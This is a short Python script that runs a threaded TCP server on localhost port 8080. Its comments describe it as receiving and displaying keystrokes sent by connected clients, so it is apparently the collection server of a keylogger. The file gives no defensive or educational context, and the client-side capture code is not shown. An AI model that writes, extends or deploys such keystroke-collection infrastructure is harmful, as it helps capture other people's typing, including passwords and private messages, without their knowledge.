import socket
import threading

IP = 'localhost'
PORT = 8080

# Create a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the server to the address and port
s.bind((IP, PORT))

# Start listening for incoming connections
s.listen()
print(f"Listening on {IP}:{PORT}...")

def handle_client(conn, addr):
    print(f"Connection from {addr[0]}:{addr[1]}")
    
    # Receive and display keystrokes from the client
    while True:
        data = conn.recv(1024)  # Receive key data from client
        if not data:
            break
        print(f"Keystroke from {addr[0]}:{addr[1]} - {data.decode()}")
    
    # Close the connection
    conn.close()
    print(f"Connection from {addr[0]}:{addr[1]} closed")

# Main server loop to accept connections
while True:
    # Accept a new connection
    conn, addr = s.accept()
    
    # Handle the client in a new thread
    client_thread = threading.Thread(target=handle_client, args=(conn, addr))
    client_thread.start()
